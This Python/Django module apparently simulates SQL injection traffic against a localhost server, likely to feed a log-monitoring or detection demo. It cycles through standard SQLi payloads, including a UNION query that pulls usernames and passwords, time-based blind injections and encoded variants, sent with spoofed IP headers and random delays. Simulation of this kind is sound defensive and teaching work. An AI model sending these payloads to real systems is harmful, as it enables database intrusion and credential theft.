import random
import time

import aiohttp
import requests
from django.core.cache import cache
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)

BASE_URL = "https://localhost/"
SPOOF_IP = ["123.12.60.101", "123.12.60.60", "123.12.60.220", "123.12.60.10", "123.12.60.50"]


SQLI_TEST_PAYLOADS = [
    # Basic boolean-based
    "search?q=' OR 1=1--",
    "search?q=admin' AND '1'='1",
    "search?q=1' OR 'a'='a",

    # Union-based
    "search?q=1' UNION SELECT NULL,NULL--",
    "search?q=' UNION SELECT username,password FROM users--",

    # Time-based blind
    "search?q=1' AND SLEEP(5)--",
    "search?q='; WAITFOR DELAY '00:00:05'--",

    # URL encoded versions
    "search?q=%27%20OR%201=1--",
    "search?q=admin%27%20AND%20%271%27=%271",

    # Comment variations
    "search?q=1'/**/OR/**/1=1--",
    "search?q=1'/*comment*/OR/**/1=1#",
]

attack_patterns = {
    "fast": lambda: random.uniform(.5, 1),
    "medium": lambda: random.uniform(1, 3),
    "slow": lambda: random.uniform(2, 5),
}

def start_sqli_simulation(session_key, start_key, attack_speed="medium"):
    stop_key = f"stop_logs_{session_key}"

    print("Starting SQLi Simulation")
    for endpoint in SQLI_TEST_PAYLOADS:
        if cache.get(stop_key) or not cache.get(start_key):
            print("Ending SQLi")
            break

        ip = random.choice(SPOOF_IP)
        headers = {
            "X-Spoofed-IP": ip,
            "User-Agent": "Mozilla/5.0",
            "Referer": BASE_URL,
        }
        delay_func = attack_patterns[attack_speed]
        url = BASE_URL + endpoint
        requests.get(url=url, headers=headers, verify=False)

        time.sleep(delay_func())

    cache.delete(start_key)
    print("SQLi Simulation is finished")